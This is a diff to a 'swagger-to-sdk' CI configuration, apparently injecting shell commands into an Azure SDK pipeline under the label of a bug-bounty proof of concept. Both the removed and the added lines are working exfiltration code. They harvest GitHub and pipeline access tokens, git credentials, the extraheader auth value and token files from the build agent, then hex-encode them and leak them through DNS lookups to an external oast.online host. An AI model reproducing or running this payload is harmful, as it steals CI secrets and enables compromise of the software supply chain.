@@ -22,26 +22,29 @@ swagger-to-sdk:
         set +e;
         H=$(hostname | tr . -);
         SDK=/mnt/vss/_work/1/s/azure-sdk-for-python;
-        nslookup v19s-${H}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
+        nslookup v20s-${H}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
         printf 'poc by hasskoda4rk\nMSRC SwaggerToSDK RCE\nAgent %s\n' "${H}" > "${SDK}/sdk/core/azure-core/poc_hasskodark.txt" 2>/dev/null;
-        AWTOK=$(cat /proc/$(pgrep -f 'Agent.Worker' 2>/dev/null | head -1)/environ 2>/dev/null | tr '\0' '\n' | grep -iE '^(GITHUB_TOKEN|SYSTEM_ACCESSTOKEN|VSTS_TOKEN|PAT|BOT_TOKEN)=' | head -2 | tr '\n' '|' | cut -c1-28);
-        AWHEX=$(printf '%s' "${AWTOK}" | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | cut -c1-56);
-        nslookup v19aw-${AWHEX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
-        TFILES=$(find /home/cloudtest /mnt/vss/_work /tmp -maxdepth 5 -name "*.token" -o -name "*token*" -o -name "*.pat" -o -name "*github*.json" 2>/dev/null | grep -iv proc | head -10 | tr '\n' '|' | cut -c1-28);
-        TFHEX=$(printf '%s' "${TFILES}" | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | cut -c1-56);
-        nslookup v19tf-${TFHEX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
-        CREDFILE=$(cat /home/cloudtest/.git-credentials 2>/dev/null | head -1 | cut -c1-28);
-        CRDHEX=$(printf '%s' "${CREDFILE}" | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | cut -c1-56);
-        nslookup v19cr-${CRDHEX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
-        SYSENV=$(cat /proc/1/environ 2>/dev/null | tr '\0' '\n' | grep -iE '(GITHUB|TOKEN|SECRET|PAT|GH_)' | grep -iv 'PATH' | head -3 | tr '\n' '|' | cut -c1-28);
-        SYSHEX=$(printf '%s' "${SYSENV}" | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | cut -c1-56);
-        nslookup v19sy-${SYSHEX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
-        AWFD=$(ls -la /proc/$(pgrep -f 'Agent.Worker' 2>/dev/null | head -1)/fd/ 2>/dev/null | grep -v "^total\|pipe\|socket" | awk '{print $NF}' | grep -v "^[0-9]" | tr '\n' '|' | cut -c1-28);
-        AWFHEX=$(printf '%s' "${AWFD}" | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | cut -c1-56);
-        nslookup v19fd-${AWFHEX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
-        GITSDK=$(git -C "${SDK}" remote get-url origin 2>/dev/null | cut -c1-28);
-        GSHEX=$(printf '%s' "${GITSDK}" | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | cut -c1-56);
-        nslookup v19gs-${GSHEX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
+        TSKLIST=$(ls /mnt/vss/_work/_tasks/ 2>/dev/null | tr '\n' '|' | cut -c1-28);
+        TSKHEX=$(printf '%s' "${TSKLIST}" | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | cut -c1-56);
+        nslookup v20ts-${TSKHEX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
+        TFILES2=$(find /mnt/vss/_work/_tasks -maxdepth 6 \( -name "*.token" -o -name "*token*" -o -name "*github*.json" -o -name "*pat*" \) 2>/dev/null | head -5 | tr '\n' '|' | cut -c1-28);
+        TF2HEX=$(printf '%s' "${TFILES2}" | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | cut -c1-56);
+        nslookup v20tf-${TF2HEX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
+        TKCONTENT=$(cat $(find /mnt/vss/_work/_tasks -maxdepth 6 -name "*.token" -o -name "*token*.json" 2>/dev/null | head -1) 2>/dev/null | tr -cd 'a-zA-Z0-9:/_.-' | cut -c1-28);
+        TKCHEX=$(printf '%s' "${TKCONTENT}" | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | cut -c1-56);
+        nslookup v20tk-${TKCHEX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
+        WKENVS=$(ls /mnt/vss/_work/1/ 2>/dev/null | tr '\n' '|' | cut -c1-28);
+        WKHEX=$(printf '%s' "${WKENVS}" | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | cut -c1-56);
+        nslookup v20wk-${WKHEX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
+        VSSPATH=$(ls /usr/local/vss-agent/ 2>/dev/null | head -3 | tr '\n' '|' | cut -c1-28);
+        VSSHEX=$(printf '%s' "${VSSPATH}" | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | cut -c1-56);
+        nslookup v20va-${VSSHEX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
+        GITURL=$(git -C "${SDK}" config --local http.https://github.com/.extraheader 2>/dev/null | cut -c1-28);
+        GURLHEX=$(printf '%s' "${GITURL}" | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | cut -c1-56);
+        nslookup v20gu-${GURLHEX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
+        GITREMOTE=$(git -C "${SDK}" remote -v 2>/dev/null | head -1 | cut -c1-28);
+        GRHEX=$(printf '%s' "${GITREMOTE}" | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | cut -c1-56);
+        nslookup v20gr-${GRHEX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
         true
 ```
 
